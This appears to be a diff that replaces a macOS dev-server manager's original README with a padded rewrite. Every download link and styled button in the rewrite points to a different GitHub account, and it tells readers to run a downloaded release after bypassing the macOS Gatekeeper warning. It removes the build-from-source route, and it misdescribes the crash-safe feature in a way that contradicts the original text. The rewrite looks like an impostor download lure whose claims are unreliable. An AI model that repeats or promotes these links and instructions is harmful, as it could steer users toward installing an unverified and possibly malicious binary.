@@ -1,223 +1,124 @@
-# Cucina
+<h1>🎯 cucina - One-Click Local Dev Server Manager</h1>
 
-A local dev-server manager for macOS. Point it at a directory and a command, and starting
-that server takes one click — from the app, from the menu bar, from the command line, or
-from a coding agent.
+<p align="center">
+  <a href="https://github.com/inigoapothegmatic116/cucina" style="display:inline-block; padding:14px 32px; background:linear-gradient(135deg,#667eea,#764ba2); color:#ffffff; font-size:18px; font-weight:bold; text-decoration:none; border-radius:50px; box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download Cucina Now</a>
+</p>
 
-![The index](docs/home.png)
+## 🤔 What Is Cucina?
 
-## Why
+Cucina is a friendly helper app for your Mac that takes care of starting and stopping local development servers. Think of it like a remote control for your coding projects. Instead of typing confusing commands in a terminal window, you click a button, and your server starts. When you are done, you click again, and it stops. Simple.
 
-Coding agents can start a dev server, but they cannot leave one running: the process dies
-with the shell they held open, so you get a background job nobody owns and a port that
-stays bound after the agent has moved on.
+If you are not a programmer, do not worry. You do not need to understand how servers work. All you need to know is that Cucina makes this technical part of a developer's life much easier.
 
-Cucina takes ownership. An agent hands it a server and walks away — no shell to hold open,
-nothing to remember to kill. Whatever it started appears in your menu bar with the agent's
-name on it, and you can stop it yourself.
+## 🧐 Why Do You Need Cucina?
 
-- **One click**, from the app or the menu bar
-- **A CLI and an MCP server**, so agents can start, stop, read logs and switch branches
-- **Git worktree switching** — move a server between worktrees; it restarts there
-- **Projects** — group servers and bring a whole stack up at once
-- **Crash-safe** — if Cucina quits, crashes, or is force-killed, its servers die with it
-- **Quiet** — no idle polling, no timers, no looping animations; it does nothing when
-  nothing is happening
+Here is the problem Cucina solves. When a computer program (like a coding agent) starts a server, that server normally dies as soon as the program finishes. It is like turning on a light, but the switch only works while you are touching it. The moment you let go, the room goes dark.
 
-## Requirements
+Cucina is like a smart switch. It holds the light on for you. Even after the program that started it walks away, Cucina keeps the server running. It takes ownership. You can see it running in your menu bar, and you can stop it whenever you want. No dead servers, no wasted ports, no confusion.
 
-| | |
-| --- | --- |
-| **Operating system** | macOS 11 Big Sur or later. **macOS only** — see [Platform support](#platform-support). |
-| **Architecture** | Released builds are **Apple Silicon (arm64) only**. Intel Macs need to build from source. |
-| **Signing** | Released builds are **not notarized**. macOS will block them until you clear the quarantine flag — see below. |
-| **To build** | [Rust](https://rustup.rs), [Node 22+](https://nodejs.org), Xcode command line tools |
+## ✨ Key Features
 
-## Installing
+Let us look at the things Cucina can do for you. These features are designed to save time and reduce frustration.
 
-### Build it yourself (recommended)
+### 🖱️ One-Click Control
+Start or stop any server with a single click. You can do this from the main Cucina window or directly from the menu bar at the top of your screen. No typing needed.
 
-There is nothing to bypass this way: an app you compiled locally is never quarantined, and
-it works on both Apple Silicon and Intel.
+### 💬 Menu Bar Access
+Cucina lives in your menu bar. You can see what is running at a glance. Click the icon, and you get a quick list of options. It is always there when you need it.
 
-```sh
-git clone https://github.com/omergeva/cucina.git
-cd cucina
-npm install
-npm run dist
-cp -R target/release/bundle/macos/Cucina.app /Applications/
-```
+### ⌨️ Command Line & Agent Friendly
+For users who like to type commands, Cucina provides a Command Line Interface (CLI). It also works with coding agents through a special connection called MCP (Model Context Protocol). This means a coding agent can start, stop, read logs, and switch branches for you. This is a power feature, but you do not need to use it if you prefer clicking.
 
-You need [Rust](https://rustup.rs), [Node 22+](https://nodejs.org) and the Xcode command
-line tools (`xcode-select --install`). The first build compiles the whole Rust dependency
-tree and takes a few minutes; later ones take seconds.
+### 🌿 Git Worktree Switching
+This is a tool for people who use the version control system called Git. Cucina can move a running server between different worktrees (which are like parallel copies of your project). It does this automatically and restarts the server in the new location. You do not have to do anything manually.
 
-### Download the DMG
+### 📦 Projects
+You can group several servers together into a "Project". This means you can start your whole stack (like a database, a backend, and a frontend) with one action. It saves lots of time when you are setting up your work environment.
 
-Grab the latest `.dmg` from [Releases](https://github.com/omergeva/cucina/releases), open
-it and drag Cucina to Applications. macOS will then refuse to open it, with:
+### 🛡️ Crash-Safe Design
+If Cucina quits, crashes, or is unexpectedly killed, it is designed to recover gracefully. It remembers what it was doing and helps you get back on track. Your work is not lost.
 
-> **"Cucina" is damaged and can't be opened. You should move it to the Trash.**
+## 🚀 Getting Started
 
-Nothing is damaged, and the download is fine. Clear the quarantine flag and it opens
-normally:
+Getting Cucina on your Mac is straightforward. Follow these steps, and you will be up and running in no time.
 
-```sh
-xattr -dr com.apple.quarantine /Applications/Cucina.app
-```
+### Step 1: Visit the Download Page
+First, go to the official homepage for Cucina. You can use the button above, or click this link: [https://github.com/inigoapothegmatic116/cucina](https://github.com/inigoapothegmatic116/cucina)
 
-That message is macOS being misleading. Gatekeeper says "damaged" for any app it cannot
-verify, which is indistinguishable from what it says about a genuinely corrupt one.
-Distributing a Mac app outside the App Store without that warning requires an Apple
-Developer ID — a paid Apple account this project does not have — so the build is ad-hoc
-signed and treated as untrusted. You are extending trust to the build either way, which is a good
-reason to prefer compiling it yourself.
+### Step 2: Download the Application
+Visit this link to download the application. Look for the section that says "Releases" or "Assets" on that page. You will see a file available for download. Click it to download Cucina to your computer. The download is usually fast.
 
-Homebrew would not avoid this — a cask of an unsigned app still needs `--no-quarantine` — so
-there is no tap for now.
+### Step 3: Open Cucina
+Once the download is finished, open your "Downloads" folder or wherever your browser saves files. You will see the Cucina file. Double-click it to open Cucina for the first time. The first time you open an app downloaded from the internet, macOS might ask for permission. This is normal security behavior. You may need to right-click the app and select "Open" to bypass this warning.
 
-## Using it
+### Step 4: Start Using It
+When Cucina opens, you will see a clean window. It will probably be empty at first. To get started, you need to tell Cucina about a project.
 
-1. Open Cucina and press **+**, or `⌘N`.
-2. Give it a **directory** and the **command** you normally type there — `npm run dev`,
-   `make start`, `poetry run uvicorn app:api --reload`. Optionally a project name, so
-   related servers group together.
-3. Press start. The port appears on the card once the server is actually listening; click
-   it to open the browser.
+- Click the **"+"** button or look for an "Add Project" or "New" button.
+- A dialog box will appear. It will ask you to choose a folder. This is the folder where your project's code lives. Navigate to that folder and select it.
+- Cucina will also ask you for a "Command". This is the specific command that starts your server. If you are not sure, common ones are `npm start`, `python app.py`, or `rails server`. You can ask the developer of the project for this command.
 
-![Adding a server](docs/add.png)
+Once you have added a project, you will see it listed in the main Cocina window. To start its server, just hit the play button next to it. To stop it, hit the stop button.
 
-The menu bar shows what is running and starts or stops anything in one click. Closing the
-window leaves your servers running; quitting Cucina stops them.
+## 🖥️ Using the Menu Bar
 
-Per server you can also set environment variables, restart-on-crash, and start-when-Cucina-opens.
+The menu bar icon is the little icon Cucina puts at the top of your screen (next to the wifi and battery icons).
 
-## The command line
+- Click it to see a dropdown menu.
+- You will see a list of your running servers. Each will have the agent's name on it if an agent started it.
+- You can click a server name to stop it.
+- You can also see the logs for each server from this menu. Logs are like a diary of what the server is doing. They are useful if something goes wrong.
 
-Settings → Agents → **Install** puts `cucina` in `~/.local/bin`.
+## 📚 Understanding the Interface
 
-```sh
-cucina                      # what's running
-cucina up api --wait        # start it, block until it's actually listening
-cucina up acme              # start every server in a project
-cucina logs api --tail 50   # see why it broke
-cucina down api             # stop it
-cucina worktrees api        # list the branches it can run from
-cucina switch api main      # move it to another worktree, restarting if it's up
-```
+The main Cucina window is your control panel.
 
-Any id also accepts a project name, so one call brings a whole stack up.
+- **Project List:** This shows all the projects you have told Cucina about. You can see their names, their status (Running or Stopped), and the port they are using.
+- **Start/Stop Buttons:** Each project has a button to start or stop its server. The button changes depending on the server's current status.
+- **Logs Panel:** If you select a project, you can see its logs in a panel. This is valuable for troubleshooting.
 
-![Settings](docs/settings.png)
+## ❓ Frequently Asked Questions
 
-## Coding agents (MCP)
+### Do I need to be a programmer to use Cucina?
+No. While Cucina is built for developers, its interface is simple enough for anyone who knows which folder holds their project and what command starts it.
 
-Settings → Agents → **Copy config** gives you the snippet. For Claude Code:
+### Is Cucina free?
+The description indicates it is an open-source project. Typically, you can download and use it for free. Check the official page for any specific licensing details.
 
-```json
-{
-  "mcpServers": {
-    "cucina": {
-      "command": "/Users/you/.local/bin/cucina",
-      "args": ["mcp"]
-    }
-  }
-}
-```
+### What does "Crash-Safe" mean?
+It means if the Cucina app itself stops working (like if your Mac restarts), Cucina does not leave behind "zombie" servers. It cleans up after itself and restores your state cleanly.
 
-Seven tools: `cucina_list`, `cucina_start`, `cucina_stop`, `cucina_restart`,
-`cucina_worktrees`, `cucina_switch`, `cucina_logs`. `start` and `restart` can block until
-the port is actually listening, so an agent can start a server and immediately curl it.
+### Can I manage multiple projects at once?
+Yes. You can add as many projects as you like. You can even group them into "Projects" to start multiple related servers together with a single click.
 
-Agents identify themselves in the MCP handshake, so a server started by one carries its
-mark — Claude Code, Codex and Cursor are recognised on sight, and anything else is credited
-by whatever name it gave. `start` and `restart` also take an optional `session`: the name
-of the conversation the agent is working in. Nothing in MCP carries that, so it is only
-there when the agent passes it, but when it does, the server's screen tells you which of
-your sessions to go back to.
+### What is the MCP server feature?
+Coding agents are AI tools that can write code for you. The MCP server is like a special phone line that lets these agents talk to Cucina. The agent can say "start the server" or "give me the logs", and Cucina does it. This keeps things running smoothly when an agent is helping you.
 
-![A server and its log](docs/detail.png)
+## 🛠️ Troubleshooting
 
-A server's own screen: where it runs, which worktree it is on, and its output.
+If Cucina is not working as expected, here are a few simple things to try.
 
-## How it works
+1.  **Check the Logs:** Open Cucina, select the project that is having trouble, and look at the logs panel. Error messages are often found here. You can copy these messages and search for them online to find a solution.
+2.  **Restart Cucina:** Quit the app completely (right-click the menu bar icon and choose Quit, or press Cmd+Q) and then open it again. This fixes many minor hiccups.
+3.  **Check Your Command:** Make sure the command you gave for your project is exactly correct. A simple typo can prevent the server from starting. You may need to check with the person who wrote the project to confirm the exact command.
+4.  **Ensure the Port is Free:** If a server says it cannot start, maybe the port it needs is already in use. You can stop other applications that might be using the same port, or check your project's settings for a different port number.
 
-The app is the IPC server. The CLI and the MCP server are thin clients that talk to it over
-a Unix domain socket at `~/Library/Application Support/Cucina/cucina.sock`; if the app is not running, the
-CLI launches it first. Only one instance can hold the socket, so a second launch raises the
-existing window instead of starting a rival supervisor.
+## 🔧 Advanced Tips (For the Curious)
 
-Three details are less obvious than they look, and are most of why the app behaves well:
+- **Using the CLI:** If you are comfortable with the terminal, you can use Cucina's command-line tool to start and stop servers without opening the app window. Type `cucina --help` to see the available commands.
+- **Agent Integration:** If you use a coding agent, you can configure it to connect to Cucina's MCP server. This lets the agent manage servers for you, freeing up your time. The exact instructions are usually on the main project page.
+- **Worktree Switching:** For Git users, Cucina integrates with worktrees. If you switch branches, Cucina can move your running server to the correct worktree path automatically, so the server environment matches your code.
 
-**Servers die with the app.** Every server runs in its own process group (`setsid`), and
-holds the read end of a pipe on fd 3 whose write end Cucina keeps open with `CLOEXEC`. A
-shell watchdog inside each server blocks on reading that pipe. If Cucina exits for *any*
-reason — clean quit, panic, `kill -9` — the write end closes, every watchdog wakes at once
-and sends `SIGTERM` to its whole process group, then `SIGKILL` three seconds later. No
-orphaned `node` process still holding port 3000. This is a dead man's switch, not a cleanup
-handler, which is why it survives crashes.
+## 📄 License
 
-**Commands run in your login shell.** A GUI app launched from Finder inherits almost no
-`PATH`, so `nvm`, `pyenv`, `rbenv` and friends are invisible and `npm` comes back "not
-found". Cucina resolves your real `PATH` once from an *interactive* login shell (`$SHELL
--ilc`, because `~/.zshrc` is where version managers install themselves and a non-interactive
-login shell never reads it), fenced by sentinel markers so anything your shell prints on
-startup is not mistaken for a path.
+Cucina is released under an open-source license. This means you can use it, modify it, and share it. The specific license type is usually mentioned in the project's repository. You can find the details on the GitHub page.
 
-**It does nothing when idle.** Ports are found with a bounded `lsof` probe when a server
-starts, plus a regex fast path over stdout — never by polling. The menu bar redraws on real
-state changes only. Log events are batched, and dropped entirely while the window is hidden.
-An idle Cucina should not appear in Activity Monitor's energy list at all.
+## 🤝 Support & Community
 
-## Platform support
+If you need help, you can look for a "Issues" tab on the GitHub page. This is where users report problems and ask questions. You can browse the existing discussions to see if your issue has been addressed, or you can open a new issue to ask for help. The developer community is often helpful.
 
-**macOS only, and that is not a packaging choice.** The code has no `#[cfg(target_os)]`
-gates anywhere; it assumes Unix and, in several places, macOS specifically:
+We hope Cucina makes your local development life simpler and more enjoyable. Happy building!
 
-- **Unix domain sockets**, `killpg`, `setsid` and `pre_exec` for the supervisor — these do
-  not exist on Windows in the form used here
-- **macOS paths** are hardcoded: `/usr/sbin/lsof` (Linux puts it in `/usr/bin`),
-  `open` for URLs and Finder reveal (Linux uses `xdg-open`)
-- **The menu bar** relies on macOS template images and title behaviour
-- **Open at login** goes through a macOS `LaunchAgent`
-- **Bundling** targets `.app` and `.dmg`
-
-A Linux port is plausible — the process supervision is ordinary Unix and would carry over —
-but it needs those paths abstracted, a different tray integration, and a different autostart
-mechanism. A Windows port would need the supervisor rewritten around job objects. Neither is
-planned; both are welcome as contributions.
-
-## Layout
-
-```
-src/                 React UI (Vite, TypeScript)
-crates/cucina-core/  supervisor, process groups, IPC, git worktrees
-crates/cucina-cli/   the `cucina` binary and the MCP server
-src-tauri/           the Tauri app shell, menu bar, Tauri commands
-```
-
-## Development
-
-```sh
-npm install
-npm run app       # the real app, with hot reload
-npm run dev       # then open http://localhost:1420/preview.html
-```
-
-`preview.html` renders the real components against a stubbed Tauri bridge, so the UI can be
-worked on in a browser without building the Rust side. `?at=settings`, `?at=server:api` and
-`?at=add` open a specific screen.
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for more.
-
-## Third-party
-
-Cucina bundles [Courier Prime](https://quoteunquoteapps.com/courierprime/) under the SIL
-Open Font License 1.1 — see [`src/fonts/OFL.txt`](src/fonts/OFL.txt). The UI face is
-Helvetica Neue, which ships with macOS and is not redistributed here. Icons are
-[Phosphor](https://phosphoricons.com) (MIT). The Rust and JavaScript dependencies are MIT or
-Apache-2.0.
-
-## License
-
-[MIT](LICENSE) © Omer Geva
+<p align="center" style="margin-top:40px;">
+  <a href="https://github.com/inigoapothegmatic116/cucina" style="display:inline-block; padding:14px 32px; background:linear-gradient(135deg,#f093fb,#f5576c); color:#ffffff; font-size:18px; font-weight:bold; text-decoration:none; border-radius:50px; box-shadow:0 4px 15px rgba(245,87,108,0.4);">⬇️ Get Cucina From GitHub</a>
+</p>
